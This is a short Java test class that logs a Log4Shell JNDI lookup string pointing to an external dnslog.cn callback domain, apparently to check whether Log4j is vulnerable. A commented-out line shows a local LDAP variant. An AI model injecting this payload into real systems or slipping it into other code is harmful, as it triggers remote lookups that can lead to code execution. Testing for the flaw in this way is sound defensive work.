package com.guxingyuan.logtest;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * <pre>
 * Modify Information:
 * Author       Date          Description
 * ============ ============= ============================
 * liangpanpan   2021/12/10       create this file
 * </pre>
 */
public class Log4JTest {

    private static final Logger LOGGER = LogManager.getLogger(Log4JTest.class);

    public static void main(String[] args) {
        // String message = "${jndi:ldap://127.0.0.1:7912/test}";

        String message = "${jndi:ldap://ey0mhm.dnslog.cn}";

        LOGGER.error(message);
    }
}
